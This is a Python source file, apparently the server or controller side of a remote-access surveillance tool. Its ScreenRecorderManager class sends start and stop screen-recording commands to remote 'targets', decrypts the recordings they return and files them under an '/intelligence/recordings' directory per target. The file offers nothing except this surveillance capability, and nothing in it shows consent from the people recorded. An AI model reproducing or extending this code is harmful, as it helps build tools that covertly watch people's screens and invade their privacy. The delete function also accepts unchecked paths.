import os
import logging
import json
import base64
from datetime import datetime
from typing import Optional

logger = logging.getLogger(__name__)

try:
    from crypto_agility_manager import CryptoAgilityManager
    from network_handler import ConnectionManager
except ImportError:
    CryptoAgilityManager = None
    ConnectionManager = None
    logger.warning("Crypto or Network modules not available")

class ScreenRecorderManager:
    def __init__(self, crypto: Optional[CryptoAgilityManager] = None, network: Optional[ConnectionManager] = None):
        self.crypto = crypto
        self.network = network
        self.storage_dir = os.environ.get("SCREEN_RECORDINGS_DIR", "/intelligence/recordings")
        os.makedirs(self.storage_dir, exist_ok=True)

    def start_recording(self, target_id: str, duration: int = 60, quality: str = "medium") -> bool:
        if not self.network:
            logger.error("Network manager not available")
            return False
        command = {
            "type": "start_screen_record",
            "duration": duration,
            "quality": quality,
            "timestamp": datetime.utcnow().isoformat()
        }
        try:
            cmd_str = json.dumps(command)
            self.network.send_command(target_id, cmd_str)
            logger.info(f"Recording start command sent to {target_id}")
            return True
        except Exception as e:
            logger.error(f"Failed to send start command: {e}")
            return False

    def stop_recording(self, target_id: str) -> bool:
        if not self.network:
            return False
        command = {"type": "stop_screen_record"}
        try:
            self.network.send_command(target_id, json.dumps(command))
            logger.info(f"Recording stop command sent to {target_id}")
            return True
        except Exception as e:
            logger.error(f"Stop command failed: {e}")
            return False

    def process_recording(self, target_id: str, encrypted_data: bytes, filename: str) -> Optional[str]:
        if self.crypto:
            try:
                data = self.crypto.decrypt_data(encrypted_data)
            except Exception as e:
                logger.error(f"Decryption failed: {e}")
                return None
        else:
            data = encrypted_data

        device_dir = os.path.join(self.storage_dir, target_id)
        os.makedirs(device_dir, exist_ok=True)
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        safe_filename = f"{timestamp}_{filename.replace('/', '_')}"
        full_path = os.path.join(device_dir, safe_filename)

        try:
            with open(full_path, "wb") as f:
                f.write(data)
            logger.info(f"Recording saved: {full_path}")
            return full_path
        except Exception as e:
            logger.error(f"File write error: {e}")
            return None

    def list_recordings(self, target_id: Optional[str] = None) -> list:
        base = os.path.join(self.storage_dir, target_id) if target_id else self.storage_dir
        if not os.path.isdir(base):
            return []
        result = []
        for root, _, files in os.walk(base):
            rel = os.path.relpath(root, self.storage_dir)
            for f in files:
                result.append(os.path.join(rel, f))
        return result

    def delete_recording(self, file_path: str) -> bool:
        full = os.path.join(self.storage_dir, file_path)
        if os.path.exists(full):
            try:
                os.remove(full)
                logger.info(f"Deleted {full}")
                return True
            except Exception as e:
                logger.error(f"Delete failed: {e}")
        return False